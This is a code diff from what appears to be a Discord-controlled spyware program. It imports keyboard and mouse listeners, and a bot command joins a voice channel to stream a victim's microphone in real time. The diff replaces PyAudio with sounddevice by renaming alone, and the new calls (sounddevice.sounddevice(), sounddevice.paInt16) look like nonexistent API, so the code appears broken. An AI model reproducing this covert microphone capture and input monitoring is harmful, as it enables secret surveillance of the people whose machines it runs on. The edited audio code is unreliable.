@@ -33,7 +33,7 @@ import datetime
 from datetime import datetime
 import atexit
 import pyttsx3
-import pyaudio
+import sounddevice
 import base64
 from pynput.keyboard import Key, Listener
 from pynput import keyboard, mouse
@@ -896,12 +896,12 @@ def download_libopus():
 opuslib_path = download_libopus()
 discord.opus.load_opus(opuslib_path)
 
-# PyAudioPCM class for streaming audio from the microphone
-class PyAudioPCM(discord.AudioSource):
+# sounddevicePCM class for streaming audio from the microphone
+class sounddevicePCM(discord.AudioSource):
     def __init__(self, channels=2, rate=48000, chunk=960, input_device=None) -> None:
-        p = pyaudio.PyAudio()
+        p = sounddevice.sounddevice()
         self.chunks = chunk
-        self.input_stream = p.open(format=pyaudio.paInt16, channels=channels, rate=rate, input=True, input_device_index=input_device, frames_per_buffer=chunk)
+        self.input_stream = p.open(format=sounddevice.paInt16, channels=channels, rate=rate, input=True, input_device_index=input_device, frames_per_buffer=chunk)
     def read(self) -> bytes:
         return self.input_stream.read(self.chunks)
 
@@ -924,7 +924,7 @@ async def mic_stream_start(ctx):
         return
 
     vc = await voice_channel.connect(self_deaf=True)
-    vc.play(PyAudioPCM())
+    vc.play(sounddevicePCM())
     await ctx.send(f"`[{current_time()}] Joined voice-channel and streaming microphone in realtime`")
 
     # Log messages (you can replace these with actual logging if needed)
